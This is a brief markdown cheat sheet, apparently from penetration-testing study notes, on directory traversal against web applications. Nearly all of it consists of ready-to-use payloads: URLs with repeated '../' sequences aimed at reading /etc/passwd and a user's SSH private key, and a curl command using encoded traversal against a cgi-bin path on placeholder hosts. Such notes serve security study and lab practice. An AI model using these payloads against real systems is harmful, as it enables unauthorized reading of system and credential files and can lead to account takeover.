# Directory Traversal

__REQUIRES__

 - Webapp misconfiguration

## Common Paths

How file traversal can be exploited.
```text
http://example.local/meteor/index.php?page=../../../../../../../../../etc/passwd

http://example.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

## Character Encoding

Double-encoding is also a thing you can do.
```bash
curl http://example.local/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```